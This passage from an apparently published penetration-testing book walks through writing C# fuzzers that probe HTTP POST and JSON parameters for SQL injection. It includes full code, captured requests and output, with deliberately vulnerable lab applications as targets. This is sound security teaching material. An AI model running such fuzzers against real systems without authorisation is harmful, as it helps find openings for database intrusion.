class="calibre4"><span class="italic">Figure 2-4: The Connection Settings dialog</span></span></p></li><a id="filepos150831"/><li value="4" class="calibre_21"><p class="calibre_6"> Select <span class="bold">Manual proxy configuration</span> and enter <span class="bold">127.0.0.1</span> into the HTTP Proxy field and <span class="bold">8080</span> into the Port field. Click <span class="bold">OK</span> and then close the Connection Settings dialog.</p></li></ol><p class="calibre_24">Now all requests sent through Firefox should be directed through Burp Suite first. (To test this, go to <a href="http://google.com/"><span class="italic">http://google.com/</span></a>; you should see the request in Burp Suite’s request pane, as shown in <a href="#filepos151522">Figure 2-5</a>.) <img src="images/00026.jpg" class="calibre_28"/>
</p><p id="filepos151522" class="calibre_15"><span class="calibre4"><span class="italic">Figure 2-5: Burp Suite actively capturing a request for</span></span><span class="calibre4"> google.com </span><span class="calibre4"><span class="italic">from Firefox</span></span></p><p class="calibre_6">Clicking the <span class="bold">Forward</span> button within Burp Suite should forward the request (to Google in this case) and return the response to Firefox.</p><p id="filepos151914" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Writing a POST Request Fuzzer</span></span></span></p><p class="calibre_11">We’ll write and test our POST request fuzzer against BadStore’s “What’s New” page (see <a href="#filepos152414">Figure 2-6</a>). Navigate to this page in Firefox and click the <span class="bold">What’s New</span> menu item on the left.</p><p class="calibre_22"><img src="images/00028.jpg" class="calibre_29"/></p><p id="filepos152414" class="calibre_15"><span class="calibre4"><span class="italic">Figure 2-6: The “What’s New” items page of the BadStore web application</span></span></p><p class="calibre_6"> A button at the bottom of the page is used to add checked items to your shopping cart. With Burp Suite sitting between your browser and the BadStore server, select a few items using the checkboxes on the right side of the page and then click <span class="bold">Submit</span> to initiate the HTTP request to add the items to your cart. Capturing the submit request within Burp Suite should yield a request like <a href="#filepos153948">Listing 2-16</a>.</p><blockquote class="calibre_14"><span class="calibre4">POST /cgi-bin/badstore.cgi?action=cartadd HTTP/1.1</span><br class="calibre5"/><span class="calibre4">Host: 192.168.1.75</span><br class="calibre5"/><span class="calibre4">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:20.0) Gecko/20100101 Firefox/20.0</span><br class="calibre5"/><span class="calibre4">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br class="calibre5"/><span class="calibre4">Accept-Language: en-US,en;q=0.5</span><br class="calibre5"/><span class="calibre4">Accept-Encoding: gzip, deflate</span><br class="calibre5"/><span class="calibre4">Referer: https://192.168.1.75/cgi-bin/badstore.cgi?action=whatsnew</span><br class="calibre5"/><span class="calibre4">Connection: keep-alive</span><br class="calibre5"/><span class="calibre4">Content-Type: application/x-www-form-urlencoded</span><br class="calibre5"/><span class="calibre4">Content-Length: 63</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4">cartitem=1000&amp;cartitem=1003&amp;Add+Items+to+Cart=Add+Items+to+Cart </span><a id="filepos153948"/><span class="calibre4"><span class="italic">Listing 2-16: HTTP POST request from Burp Suite</span></span></blockquote><p class="calibre_6">The request shown in <a href="#filepos153948">Listing 2-16</a> is a typical POST request with URL-encoded parameters (a set of special characters, some of which are whitespace such as spaces and newlines). Note that this request uses plus signs (<span class="calibre4">+</span>) instead of spaces. Save this request to a text file. We’ll use it later to systematically fuzz the parameters being sent in the HTTP POST request.</p><p class="calibre_16"><span class="calibre3"><span class="bold"><span class="calibre_17"><span class="calibre_18">  NOTE </span></span></span></span></p><blockquote class="calibre_7"><span class="italic">The parameters in an HTTP POST request are included in the last line of the request, which defines the data being posted in key/value form. (Some POST requests post multipart forms or other exotic types of data, but the general principle remains the same.)</span></blockquote><p class="calibre_6">Notice in this request that we are adding the items with an ID of 1000 and 1003 to the cart. Now look at the Firefox window, and you should notice that these numbers correspond to the <span class="calibre4">ItemNum</span> column. We are posting a parameter along with these IDs, essentially telling the application what to do with the data we’re sending (namely, add the items to the cart). As you can see, the only parameters that might be susceptible to SQL injection are the two <span class="calibre4">cartitem</span> parameters, because these are the parameters that the server will interpret.</p><p id="filepos155612" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">The Fuzzing Begins</span></span></span></p><p class="calibre_11">Before we start fuzzing our POST request parameters, we need to set up a little bit of data, as shown in <a href="#filepos156934">Listing 2-17</a>.</p><blockquote class="calibre_14"><span class="calibre4">public static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> string[] requestLines = ➊File.ReadAllLines(args[0]);</span><br class="calibre5"/><span class="calibre4"> ➋string[] parms = requestLines[requestLines.Length - 1].Split('&amp;');</span><br class="calibre5"/><span class="calibre4"> ➌string host = string.Empty;</span><br class="calibre5"/><span class="calibre4"> StringBuilder requestBuilder = new ➍StringBuilder();</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> foreach (string ln in requestLines)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> if (ln.StartsWith("Host:"))</span><br class="calibre5"/><span class="calibre4"> host = ln.Split(' ')[1].➎Replace("\r", string.Empty);</span><br class="calibre5"/><span class="calibre4"> requestBuilder.Append(ln + "\n");</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> string request = requestBuilder.ToString() + "\r\n";</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine(request);</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos156934" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-17: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Main()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method reading a POST request and storing the</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Host</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">header</span></span></p><p class="calibre_6">We read the request from the file using <span class="calibre4">File.ReadAllLines()</span> ➊ and pass the first argument to the fuzzing application as the argument to <span class="calibre4">ReadAllLines()</span>. We use <span class="calibre4">ReadAllLines()</span> instead of <span class="calibre4">ReadAllText()</span> because we need to split the request in order to get information out of it (namely, the <span class="calibre4">Host</span> header) before fuzzing. After reading the request line by line into a string array and grabbing the parameters from the last line of the file ➋, we declare two variables. The <span class="calibre4">host</span> variable ➌ stores the IP address of the host we are sending the request to. Declared below is a <span class="calibre4">System.Text.StringBuilder</span> ➍, which we’ll use to build the full request as a single string.</p><p class="calibre_16"><span class="calibre3"><span class="bold"><span class="calibre_17"><span class="calibre_18">  NOTE </span></span></span></span></p><blockquote class="calibre_7"><span class="italic">We use a</span>
<span class="calibre4"><span class="italic">StringBuilder</span></span>
<span class="italic">because it’s more performant than using the</span>
<span class="calibre4"><span class="italic">+=</span></span>
<span class="italic">operator with a basic string type (each time you call the</span>
<span class="calibre4"><span class="italic">+=</span></span>
<span class="italic">operator, you create a new</span>
<span class="calibre4"><span class="italic">string</span></span>
<span class="italic">object in memory). On a small file like this, you won’t notice a difference, but when you’re dealing with a lot of strings in memory, you will. Using a</span>
<span class="calibre4"><span class="italic">StringBuilder</span></span>
<span class="italic">creates only one object in memory, resulting in much less memory overhead.</span></blockquote><p class="calibre_6">Now we loop through each line in the request that was previously read in. We check whether the line begins with <span class="calibre4">"Host:"</span> and, if so, assign the second half of the host string to the <span class="calibre4">host</span> variable. (This should be an IP address.) We then call <span class="calibre4">Replace()</span> ➎ on the string to remove the trailing <span class="calibre4">\r</span>, which could be left by some versions of Mono, since an IP address does not have <span class="calibre4">\r</span> in it. Finally, we append the line with <span class="calibre4">\r\n</span> to the <span class="calibre4">StringBuilder</span>. Having built the full request, we assign it to a new string variable called <span class="calibre4">request</span>. (For HTTP, your request must end with <span class="calibre4">\r\n</span>; otherwise, the server response will hang.)</p><p id="filepos159835" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Fuzzing Parameters</span></span></span></p><p class="calibre_11">Now that we have the full request to send, we need to loop through and attempt to fuzz the parameters for SQL injections. Within this loop, we’ll use the classes <span class="calibre4">System.Net.Sockets.Socket</span> and <span class="calibre4">System.Net.IPEndPoint</span>. Because we have the full HTTP request as a string, we can use a basic socket to communicate with the server instead of relying on the HTTP libraries to create the request for us. Now we have all that we need to fuzz the server, as shown in <a href="#filepos161898">Listing 2-18</a>.</p><blockquote class="calibre_14"><span class="calibre4"> IPEndPoint rhost = ➊new IPEndPoint(IPAddress.Parse(host), 80);</span><br class="calibre5"/><span class="calibre4"> foreach (string parm in parms)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> using (Socket sock = new ➋Socket(AddressFamily.InterNetwork,</span><br class="calibre5"/><span class="calibre4"> SocketType.Stream, ProtocolType.Tcp))</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> sock.➌Connect (rhost);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> string val = parm.➍Split('=')[1];</span><br class="calibre5"/><span class="calibre4"> string req = request.➎Replace("=" + val, "=" + val + "'");</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> byte[] reqBytes = ➏Encoding.ASCII.GetBytes(req);</span><br class="calibre5"/><span class="calibre4"> sock.➐Send(reqBytes);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> byte[] buf = new byte[sock.ReceiveBufferSize];</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> sock.➑Receive(buf);</span><br class="calibre5"/><span class="calibre4"> string response = ➒Encoding.ASCII.GetString(buf);</span><br class="calibre5"/><span class="calibre4"> if (response.Contains("error in your SQL syntax"))</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("Parameter " + parm + " seems vulnerable");</span><br class="calibre5"/><span class="calibre4"> Console.Write(" to SQL injection with value: " + val + "'");</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span></blockquote><p id="filepos161898" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-18: Additional code added to</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Main()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method fuzzing the POST parameters</span></span></p><p class="calibre_6">In <a href="#filepos161898">Listing 2-18</a>, we create a new <span class="calibre4">IPEndPoint</span> object ➊ by passing a new <span class="calibre4">IPAddress</span> object returned by <span class="calibre4">IPAddress.Parse(host)</span> and the port we will be connecting to on the IP address (<span class="calibre4">80</span>). Now we can loop over the parameters grabbed from the <span class="calibre4">requestLines</span> variable previously. For each iteration, we need to create a new <span class="calibre4">Socket</span> connection ➋ to the server, and we use the <span class="calibre4">AddressFamily.InterNetwork</span> to tell the socket it is IPv4 (version 4 of the Internet Protocol, as opposed to IPv6) and use <span class="calibre4">SocketType.Stream</span> to tell the socket that this is a streaming socket (stateful, two-way, and reliable). We also use <span class="calibre4">ProtocolType.Tcp</span> to tell the socket that the protocol to be used is TCP.</p><p class="calibre_6">Once this object is instantiated, we can call <span class="calibre4">Connect()</span> ➌ on it by passing our <span class="calibre4">IPEndPoint</span> object <span class="calibre4">rhost</span> as an argument. After we have connected to the remote host on port 80, we can begin fuzzing the parameter. We split the parameter from the <span class="calibre4">foreach</span> loop on the equal sign (<span class="calibre4">=</span>) character ➍ and extract the value of that parameter using the value in the second index of the array (resulting from the method call). Then we call <span class="calibre4">Replace()</span> ➎ on the request string to replace the original value with a tainted one. For example, if our value is <span class="calibre4">'foo'</span> within the parameters string <span class="calibre4">'blah=foo&amp;blergh=bar'</span>, we would replace <span class="calibre4">foo</span> with <span class="calibre4">foo'</span> (note the apostrophe appended to the end of <span class="calibre4">foo</span>).</p><p class="calibre_6">Next, we get a byte array representing the string using <span class="calibre4">Encoding.ASCII.GetBytes()</span> ➏, and we send it over the socket ➐ to the server port specified in the <span class="calibre4">IPEndPoint</span> constructor. This is equivalent to making a request from your web browser to the URL in the address bar.</p><p class="calibre_6"> After sending the request, we create a byte array equal to the size of the response we will receive, and we fill it with the response from the server with <span class="calibre4">Receive()</span> ➑. We use <span class="calibre4">Encoding.ASCII.GetString()</span> ➒ to get the string that the byte array represents, and we can then parse the response from the server. We check the response from the server by checking whether the SQL error message we expect is in the response data.</p><p class="calibre_6">Our fuzzer should output any parameters that result in SQL errors, as shown in <a href="#filepos165521">Listing 2-19</a>.</p><blockquote class="calibre_14"><span class="calibre4">$ </span><span class="calibre4"><span class="bold">mono POST_fuzzer.exe /tmp/request</span></span><br class="calibre5"/><span class="calibre4">Parameter cartitem=1000 seems vulnerable to SQL injection with value: 1000'</span><br class="calibre5"/><span class="calibre4">Parameter cartitem=1003 seems vulnerable to SQL injection with value: 1003'</span><br class="calibre5"/><span class="calibre4">$</span></blockquote><p id="filepos165521" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-19: Output from running the POST fuzzer on the request</span></span></p><p class="calibre_6">As we can see in the fuzzer output, the <span class="calibre4">cartitem</span> HTTP parameter seems vulnerable to a SQL injection. When we insert an apostrophe into the current value of the HTTP parameter, we get back a SQL error in the HTTP response, which makes this highly likely to be vulnerable to a SQL injection attacks.</p><p id="filepos166026" class="calibre_10"><span class="calibre3"><span class="bold">Fuzzing JSON</span></span></p><p class="calibre_11">As a pentester or security engineer, you will likely run into web services that accept data serialized as JavaScript Object Notation (JSON) in some form as input. In order to help you learn to fuzz JSON HTTP requests, I’ve written a small web application called CsharpVulnJson that accepts JSON and uses the information within to persist and search user-related data. A small virtual appliance has been created so that the web service works out of the box; it is available on the VulnHub website (<a href="http://www.vulnhub.com/"><span class="italic">http://www.vulnhub.com/</span></a>).</p><p id="filepos166729" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Setting Up the Vulnerable Appliance</span></span></span></p><p class="calibre_11">CsharpVulnJson ships as an OVA file, a completely self-contained virtual machine archive that you can simply import into your choice of virtualization suite. In most cases, double-clicking the OVA file should bring up your virtualization software to automatically import the appliance.</p><p id="filepos167178" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Capturing a Vulnerable JSON Request</span></span></span></p><p class="calibre_11">Once CsharpVulnJson is running, point Firefox to port 80 on the virtual machine, and you should see a user management interface like the one shown in <a href="#filepos168102">Figure 2-7</a>. We will focus on creating users with the Create User button and the HTTP request this button makes when creating a user.</p><p class="calibre_6">Assuming Firefox is still set up to pass through Burp Suite as an HTTP proxy, fill in the Create a user fields and click <span class="bold">Create User</span> to yield an HTTP request with the user information inside a JSON hash in Burp Suite’s request pane, as in <a href="#filepos169465">Listing 2-20</a>.</p><p class="calibre_22"><img src="images/00018.jpg" class="calibre_30"/></p><p id="filepos168102" class="calibre_15"><span class="calibre4"><span class="italic">Figure 2-7: The CsharpVulnJson web application open in Firefox</span></span></p><blockquote class="calibre_14"><span class="calibre4">POST /Vulnerable.ashx HTTP/1.1</span><br class="calibre5"/><span class="calibre4">Host: 192.168.1.56</span><br class="calibre5"/><span class="calibre4">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:26.0) Gecko/20100101 Firefox/26.0</span><br class="calibre5"/><span class="calibre4">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br class="calibre5"/><span class="calibre4">Accept-Language: en-US,en;q=0.5</span><br class="calibre5"/><span class="calibre4">Accept-Encoding: gzip, deflate</span><br class="calibre5"/><span class="calibre4">Content-Type: application/json; charset=UTF-8</span><br class="calibre5"/><span class="calibre4">Referer: http://192.168.1.56/</span><br class="calibre5"/><span class="calibre4">Content-Length: 190</span><br class="calibre5"/><span class="calibre4">Cookie: ASP.NET_SessionId=5D14CBC0D339F3F054674D8B</span><br class="calibre5"/><span class="calibre4">Connection: keep-alive</span><br class="calibre5"/><span class="calibre4">Pragma: no-cache</span><br class="calibre5"/><span class="calibre4">Cache-Control: no-cache</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4">{"username":"whatthebobby","password":"propane1","age":42,"line1":"123 Main St",</span><br class="calibre5"/><span class="calibre4">"line2":"","city":"Arlen","state":"TX","zip":78727,"first":"Hank","middle":"","last":"Hill",</span><br class="calibre5"/><span class="calibre4">"method":"create"}</span></blockquote><p id="filepos169465" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-20: Create User request with JSON containing user information to save to the database</span></span></p><p class="calibre_6"> Now right-click the request pane and select <span class="bold">Copy to File</span>. When asked where to save the HTTP request on your computer, make your choice and note where the request was saved, because you’ll need to pass the path to the fuzzer.</p><p id="filepos169916" class="calibre_10"><span class="calibre3"><span class="italic"><span class="bold">Creating the JSON Fuzzer</span></span></span></p><p class="calibre_11">In order to fuzz this HTTP request, we need to separate the JSON from the rest of the request. We then need to iterate over each key/value pair in the JSON and alter the value to try to induce any SQL errors from the web server.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Reading the Request File</span></span></p><p class="calibre_11">To create the JSON HTTP request fuzzer, we start with a known-good HTTP request (the Create User request). Using the previously saved HTTP request, we can read in the request and begin the fuzzing process, as shown in <a href="#filepos171570">Listing 2-21</a>.</p><blockquote class="calibre_14"><span class="calibre4">public static void Main(string[] args)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> string url = ➊args[0];</span><br class="calibre5"/><span class="calibre4"> string requestFile = ➋args[1];</span><br class="calibre5"/><span class="calibre4"> string[] request = null;</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> using (StreamReader rdr = ➌new StreamReader(File.➍OpenRead(requestFile)))</span><br class="calibre5"/><span class="calibre4"> request = rdr.➎ReadToEnd().➏Split('\n');</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> string json = ➐request[request.Length - 1];</span><br class="calibre5"/><span class="calibre4"> JObject obj = ➑JObject.Parse(json);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> Console.WriteLine("Fuzzing POST requests to URL " + url);</span><br class="calibre5"/><span class="calibre4"> ➒IterateAndFuzz(url, obj);</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos171570" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-21: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Main</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method, which kicks off fuzzing the JSON parameter</span></span></p><p class="calibre_6">The first thing we do is store the first ➊ and second ➋ arguments passed to the fuzzer in two variables (<span class="calibre4">url</span> and <span class="calibre4">requestFile</span>, respectively). We also declare a string array that will be assigned the data in our HTTP request after reading the request from the filesystem.</p><p class="calibre_6">Within the context of a <span class="calibre4">using</span> statement, we open our request file for reading using <span class="calibre4">File.OpenRead()</span> ➍ and pass the file stream returned to the <span class="calibre4">StreamReader</span> constructor ➌. With the new <span class="calibre4">StreamReader</span> class instantiated, we can read all the data in the file with the <span class="calibre4">ReadToEnd()</span> method ➎. We also split the data in the request file using the <span class="calibre4">Split()</span> method ➏, passing a newline character to the method as the character to split the request up. The HTTP protocol dictates that newlines (carriage returns and line feeds, specifically) be used to separate the headers from the data being sent in the request. The string array returned by <span class="calibre4">Split()</span> is assigned to the request variable we declared earlier.</p><p class="calibre_6">Having read and split the request file, we can grab the JSON data we need to fuzz and begin iterating through the JSON key/value pairs to find SQL injection vectors. The JSON we want is the last line of the HTTP request, which is the last element in the request array. Because 0 is the first element in an array, we subtract 1 from the request array length, use the resulting integer to grab the last element in the request array, and assign the value to the string <span class="calibre4">json</span> ➐.</p><p class="calibre_6">Once we have the JSON separated from the HTTP request, we can parse the <span class="calibre4">json</span> string and create a <span class="calibre4">JObject</span> that we can programmatically iterate on using <span class="calibre4">JObject.Parse()</span> ➑. The <span class="calibre4">JObject</span> class is available in the Json.NET library, freely available via the NuGet package manager or at <a href="http://www.newtonsoft.com/json/"><span class="italic">http://www.newtonsoft.com/json/</span></a>. We will use this library throughout the book.</p><p class="calibre_6">After creating the new <span class="calibre4">JObject</span>, we print a status line to inform the user we are fuzzing POST requests to the given URL. Finally, we pass the <span class="calibre4">JObject</span> and the URL to make HTTP POST requests to the <span class="calibre4">IterateAndFuzz()</span> method ➒ to process the JSON and fuzz the web application.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Iterating Over the JSON Keys and Values</span></span></p><p class="calibre_11">Now we can start iterating over each JSON key/value pair and set each pair up to test for a possible SQL injection vector. <a href="#filepos176273">Listing 2-22</a> shows how to accomplish this using the <span class="calibre4">IterateAndFuzz()</span> method.</p><blockquote class="calibre_14"><span class="calibre4">private static void IterateAndFuzz(string url, JObject obj)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> foreach (var pair in (JObject)➊obj.DeepClone())</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> if (pair.Value.Type == ➋JTokenType.String || pair.Value.Type == ➌JTokenType.Integer)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("Fuzzing key: " + pair.Key);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (pair.Value.Type == JTokenType.Integer)</span><br class="calibre5"/><span class="calibre4"> ➍Console.WriteLine("Converting int type to string to fuzz");</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> JToken oldVal = ➎pair.Value;</span><br class="calibre5"/><span class="calibre4"> obj[pair.Key] = ➏pair.Value.ToString() + "'";</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> if (➐Fuzz(url, obj.Root))</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine("SQL injection vector: " + pair.Key);</span><br class="calibre5"/><span class="calibre4"> else</span><br class="calibre5"/><span class="calibre4"> Console.WriteLine (pair.Key + " does not seem vulnerable.");</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> ➑obj[pair.Key] = oldVal;</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4">}</span></blockquote><p id="filepos176273" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-22: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">IterateAndFuzz()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method, which determines which key/value pairs in the JSON to fuzz</span></span></p><p class="calibre_6">The <span class="calibre4">IterateAndFuzz()</span> method starts by looping over the key/value pairs in the <span class="calibre4">JObject</span> with a <span class="calibre4">foreach</span> loop. Because we will be altering the values within the JSON by inserting apostrophes into them, we call <span class="calibre4">DeepClone()</span> ➊ so that we get a separate object that is identical to the first. This allows us to iterate over one copy of the JSON key/value pairs while altering another. (We need to make a copy because while in a <span class="calibre4">foreach</span> loop, you can’t alter the object you are iterating over.) Within the <span class="calibre4">foreach</span> loop, we test whether the value in the current key/value pair is a <span class="calibre4">JTokenType.String</span> ➋ or <span class="calibre4">JTokenType.Integer</span> ➌ and continue fuzzing that value if the value is either the string or integer type. After printing a message ➍ to alert the user as to which key we are fuzzing, we test whether the value is an integer in order to let the user know that we are converting the value from an integer to a string.</p><p class="calibre_16"><span class="calibre3"><span class="bold"><span class="calibre_17"><span class="calibre_18">  NOTE </span></span></span></span></p><blockquote class="calibre_7"><span class="italic">Because integers in JSON have no quotes and must be a whole number or float, inserting a value with an apostrophe would cause a parsing exception. Many weakly typed web applications built with Ruby on Rails or Python will not care whether the JSON value changes type, but strongly typed web applications built with Java or C# might not behave as expected. The CsharpVulnJson web application does not care whether the type is changed on purpose.</span></blockquote><p class="calibre_6">Next, we store the old value in the <span class="calibre4">oldVal</span> variable ➎ so that we can replace it once we have fuzzed the current key/value pair. After storing the old value, we reassign the current value ➏ with the original value, but with an apostrophe tacked on the end of the value so that if it is placed in a SQL query, it should cause a parsing exception.</p><p class="calibre_6">To determine whether the altered value will cause an error in the web application, we pass the altered JSON and the URL to send it to the <span class="calibre4">Fuzz()</span> method ➐ (discussed next), which returns a Boolean value that tells us whether the JSON value could be vulnerable to SQL injection. If <span class="calibre4">Fuzz()</span> returns <span class="calibre4">true</span>, we inform the user that the value may be vulnerable to SQL injection. If <span class="calibre4">Fuzz()</span> returns <span class="calibre4">false</span>, we tell the user that the key does not seem vulnerable.</p><p class="calibre_6">Once we have determined whether a value is vulnerable to SQL injection, we replace the altered JSON value with the original value ➑ and go on to the next key/value pair.</p><p class="calibre_10"><span class="calibre3"><span class="bold">Fuzzing with an HTTP Request</span></span></p><p class="calibre_11">Finally, we need to make the actual HTTP requests with the tainted JSON values and read the response back from the server in order to determine whether the value might be injectable. <a href="#filepos181596">Listing 2-23</a> shows how the <span class="calibre4">Fuzz()</span> method creates an HTTP request and tests the response for specific strings to determine if the JSON value is susceptible to a SQL injection vulnerability.</p><blockquote class="calibre_14"><span class="calibre4">private static bool Fuzz(string url, JToken obj)</span><br class="calibre5"/><span class="calibre4">{</span><br class="calibre5"/><span class="calibre4"> byte[] data = System.Text.Encoding.ASCII.➊GetBytes(obj.➋ToString());</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> HttpWebRequest req = (HttpWebRequest)➌WebRequest.Create(url);</span><br class="calibre5"/><span class="calibre4"> req.Method = "POST";</span><br class="calibre5"/><span class="calibre4"> req.ContentLength = data.Length;</span><br class="calibre5"/><span class="calibre4"> req.ContentType = "application/javascript";</span><br class="calibre5"/><span class="calibre4"> using (Stream stream = req.➍GetRequestStream())</span><br class="calibre5"/><span class="calibre4"> stream.➎Write(data, 0, data.Length);</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> try</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> req.➏GetResponse();</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><span class="calibre4"> catch (WebException e)</span><br class="calibre5"/><span class="calibre4"> {</span><br class="calibre5"/><span class="calibre4"> string resp = string.Empty;</span><br class="calibre5"/><span class="calibre4"> using (StreamReader r = new StreamReader(e.Response.➐GetResponseStream()))</span><br class="calibre5"/><span class="calibre4"> resp = r.➑ReadToEnd();</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> return (resp.➒Contains("syntax error") || resp.➓Contains("unterminated"));</span><br class="calibre5"/><span class="calibre4"> }</span><br class="calibre5"/><br class="calibre5"/><span class="calibre4"> return false;</span><br class="calibre5"/><span class="calibre4"> }</span></blockquote><p id="filepos181596" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-23: The</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">Fuzz()</span></span><span class="calibre4">
</span><span class="calibre4"><span class="italic">method, which does the actual communication with the server</span></span></p><p class="calibre_6">Because we need to send the whole JSON string as bytes, we pass the string version of our <span class="calibre4">JObject</span> returned by <span class="calibre4">ToString()</span> ➋ to the <span class="calibre4">GetBytes()</span> ➊ method, which returns a byte array representing the JSON string. We also build the initial HTTP request to be made by calling the static <span class="calibre4">Create()</span> method ➌ from the <span class="calibre4">WebRequest</span> class to create a new <span class="calibre4">WebRequest</span>, casting the resulting object to an <span class="calibre4">HttpWebRequest</span> class. Next, we assign the HTTP method, the content length, and the content type of the request. We assign the <span class="calibre4">Method</span> property a value of <span class="calibre4">POST</span> because the default is <span class="calibre4">GET</span>, and we assign the length of our byte array that we will be sending to the <span class="calibre4">ContentLength</span> property. Finally, we assign <span class="calibre4">application/javascript</span> to the <span class="calibre4">ContentType</span> to ensure the web server knows that the data it is receiving should be well-formed JSON.</p><p class="calibre_6">Now we write our JSON data to the request stream. We call the <span class="calibre4">GetRequestStream()</span> method ➍ and assign the stream returned to a variable in the context of a <span class="calibre4">using</span> statement so that our stream is disposed of properly after use. We then call the stream’s <span class="calibre4">Write()</span> method ➎, which takes three arguments: the byte array containing our JSON data, the index of the array we want to begin writing from, and the number of bytes we want to write. (Because we want to write all of them, we pass in the entire length of the data array.) To get the response back from the server, we create a <span class="calibre4">try</span> block so that we can catch any exceptions and retrieve their responses. We call <span class="calibre4">GetResponse()</span> ➏ within the <span class="calibre4">try</span> block to attempt to retrieve a response from the server, but we only care about responses with HTTP return codes of 500 or higher, which would cause <span class="calibre4">GetResponse()</span> to throw an exception.</p><p class="calibre_6">In order to catch these responses, we follow the <span class="calibre4">try</span> block with a <span class="calibre4">catch</span> block in which we call <span class="calibre4">GetResponseStream()</span> ➐ and create a new <span class="calibre4">StreamReader</span> from the stream returned. Using the stream’s <span class="calibre4">ReadToEnd()</span> method ➑, we store the server’s response in the string variable <span class="calibre4">resp</span> (declared before the <span class="calibre4">try</span> block started).</p><p class="calibre_6"> To determine whether the value sent may have caused a SQL error, we test the response for one of two known strings that appear in SQL errors. The first string, <span class="calibre4">"syntax error"</span> ➒, is a general string that is present in the MySQL error, as shown in <a href="#filepos185118">Listing 2-24</a>.</p><blockquote class="calibre_14"><span class="calibre4">ERROR: 42601: syntax error at or near &amp;quot;dsa&amp;quot; </span><a id="filepos185118"/><span class="calibre4"><span class="italic">Listing 2-24: Sample MySQL error message containing</span></span><span class="calibre4">
</span><span class="calibre7"><span class="italic">syntax error</span></span></blockquote><p class="calibre_6">The second string, <span class="calibre4">"unterminated"</span> ➓, appears in a specific MySQL error when a string is not terminated, as in <a href="#filepos185646">Listing 2-25</a>.</p><blockquote class="calibre_14"><span class="calibre4">ERROR: 42601: unterminated quoted string at or near "'); "</span></blockquote><p id="filepos185646" class="calibre_15"><span class="calibre4"><span class="italic">Listing 2-25: Sample MySQL error message containing</span></span><span class="calibre4">
